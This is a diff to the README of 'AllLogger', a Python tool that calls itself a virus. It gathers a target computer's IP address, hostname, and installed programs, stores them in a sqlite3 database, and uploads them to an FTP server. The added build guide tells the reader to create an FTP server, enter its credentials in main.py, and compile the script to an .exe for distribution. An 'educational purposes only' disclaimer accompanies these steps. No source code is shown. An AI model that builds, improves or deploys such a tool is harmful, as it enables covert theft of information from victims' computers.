@@ -7,6 +7,7 @@ AllLogger is a virus that allows you to do :
 - Get the target computer private IP Address
 - Get list of installed application on desktop folder
 - Get list of installed program using wmic product get name
+- Insert all of that data to sqlite3 database and upload it to the cloud
 
 # Disclaimer : This Project Is For Educational Purposes Only
 I AM NOT RESPONSIBLE FOR ANY ILLEGAL USE OF THIS PROJECT
@@ -17,5 +18,6 @@ When you run this project its started getting target computer ip address, hostna
 If you think you can improve this project you can submit it in issue tab.
 
 # Guide to make executable :
-You need to change ftp server address, username, password to your ftp server (you can create one on 000webhost for free) on main.py
-And you can compile the python script to .exe using pyinstaller or auto-py-to-exe
+1.Create ftp server (if you dont have one)
+2.Change ftp server address, username, password in main.py to your ftp server and login credential
+3.Compile python script to executables(.exe) using pyinstaller or auto-py-to-exe
